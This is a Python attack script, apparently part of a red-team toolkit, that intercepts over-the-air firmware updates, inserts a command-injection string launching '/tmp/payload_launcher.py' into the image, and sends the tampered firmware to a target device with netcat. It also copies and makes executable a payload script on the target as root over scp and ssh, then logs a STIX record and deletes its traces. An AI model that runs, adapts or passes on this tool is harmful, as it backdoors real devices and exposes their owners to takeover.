#!/usr/bin/env python3
# Path: modules/attacks/ota_firmware_injector.py

import subprocess
import argparse
import os
import json
import socket
import hashlib
from scapy.all import sniff, TCP, Raw
from datetime import datetime

FIRMWARE_ORIGINAL = "original_firmware.bin"
FIRMWARE_MODIFIED = "modified_firmware.bin"
PAYLOAD_SCRIPT_NAME = "payload_launcher.py"
BACKDOOR_PAYLOAD = f";python3 /tmp/{PAYLOAD_SCRIPT_NAME};".encode("utf-8")
WEBSOCKET_ALERT_FILE = "results/dashboard_event.json"
STIX_OUTPUT_FILE = "results/stix_ota_injection.json"

def intercept_firmware(interface, port, timeout):
    print(f"[+] Intercepting OTA firmware on interface {interface}, TCP port {port}")
    firmware_data = bytearray()

    def packet_handler(packet):
        if TCP in packet and packet[TCP].dport == port and Raw in packet:
            firmware_data.extend(packet[Raw].load)

    sniff(iface=interface, filter=f"tcp port {port}", prn=packet_handler, timeout=timeout)

    if firmware_data:
        with open(FIRMWARE_ORIGINAL, "wb") as fw_file:
            fw_file.write(firmware_data)
        print(f"[+] Firmware intercepted successfully ({len(firmware_data)} bytes)")
        return True
    else:
        print("[!] No firmware data intercepted.")
        return False

def inject_backdoor(original_fw, modified_fw, payload):
    print("[+] Injecting Python backdoor execution payload into firmware")
    with open(original_fw, "rb") as orig:
        firmware = orig.read()

    inject_offset = firmware.find(b"\xFF\xFF\xFF")
    if inject_offset == -1:
        inject_offset = len(firmware) // 2

    modified_firmware = firmware[:inject_offset] + payload + firmware[inject_offset:]
    with open(modified_fw, "wb") as mod:
        mod.write(modified_firmware)

    print(f"[+] Firmware successfully injected at offset {inject_offset}")
    return inject_offset

def broadcast_firmware(target_ip, port):
    print(f"[+] Broadcasting modified firmware to {target_ip}:{port}")
    command = ["nc", "-w", "3", target_ip, str(port)]
    with open(FIRMWARE_MODIFIED, "rb") as firmware:
        subprocess.run(command, stdin=firmware, check=True)
    print("[+] Modified firmware broadcast completed")

def deploy_payload_script(target_ip):
    if not os.path.exists(PAYLOAD_SCRIPT_NAME):
        print(f"[!] Payload script {PAYLOAD_SCRIPT_NAME} not found.")
        return
    print(f"[+] Deploying payload_launcher.py to {target_ip}")
    subprocess.run(["scp", PAYLOAD_SCRIPT_NAME, f"root@{target_ip}:/tmp/{PAYLOAD_SCRIPT_NAME}"], check=True)
    subprocess.run(["ssh", f"root@{target_ip}", f"chmod +x /tmp/{PAYLOAD_SCRIPT_NAME}"], check=True)
    print("[+] Payload script deployed")

def generate_stix_report(target_ip, offset):
    print("[+] Generating STIX metadata")
    report = {
        "type": "attack-pattern",
        "id": f"attack-pattern--{hashlib.md5(target_ip.encode()).hexdigest()}",
        "created": datetime.utcnow().isoformat() + "Z",
        "name": "OTA Firmware Injection",
        "description": f"Injected backdoor at byte offset {offset} targeting {target_ip}",
        "labels": ["firmware", "ota", "injector", "redteam"],
        "x_custom_target_ip": target_ip
    }
    with open(STIX_OUTPUT_FILE, "w") as f:
        json.dump(report, f, indent=2)
    print(f"[+] STIX report saved to {STIX_OUTPUT_FILE}")

def broadcast_dashboard_event(message):
    print("[+] Sending WebSocket dashboard alert")
    event = {
        "type": "firmware_event",
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "message": message
    }
    with open(WEBSOCKET_ALERT_FILE, "w") as f:
        json.dump(event, f)

def cleanup():
    print("[+] Cleaning up temporary firmware files")
    for f in [FIRMWARE_ORIGINAL, FIRMWARE_MODIFIED]:
        if os.path.exists(f):
            os.remove(f)
            print(f"[+] Removed {f}")

def main():
    parser = argparse.ArgumentParser(description="OTA Firmware Injector with Payload Chaining and STIX export")
    parser.add_argument("--interface", required=True, help="Interface to intercept OTA traffic")
    parser.add_argument("--listen-port", type=int, required=True, help="OTA port to sniff")
    parser.add_argument("--broadcast-ip", required=True, help="Target device IP")
    parser.add_argument("--broadcast-port", type=int, required=True, help="Port to send modified firmware")
    parser.add_argument("--timeout", type=int, default=60, help="Sniff timeout (seconds)")
    parser.add_argument("--deploy-payload", action="store_true", help="SCP deploy payload script after injection")
    parser.add_argument("--stix", action="store_true", help="Export STIX metadata")

    args = parser.parse_args()

    try:
        if intercept_firmware(args.interface, args.listen_port, args.timeout):
            offset = inject_backdoor(FIRMWARE_ORIGINAL, FIRMWARE_MODIFIED, BACKDOOR_PAYLOAD)
            broadcast_firmware(args.broadcast_ip, args.broadcast_port)
            if args.deploy_payload:
                deploy_payload_script(args.broadcast_ip)
            if args.stix:
                generate_stix_report(args.broadcast_ip, offset)
            broadcast_dashboard_event(f"Injected firmware into {args.broadcast_ip} at offset {offset}")
        else:
            print("[!] No firmware captured. Aborting.")
    except subprocess.CalledProcessError as e:
        print(f"[!] Execution error: {e}")
    except KeyboardInterrupt:
        print("[+] User interrupted operation.")
    finally:
        cleanup()

if __name__ == "__main__":
    main()
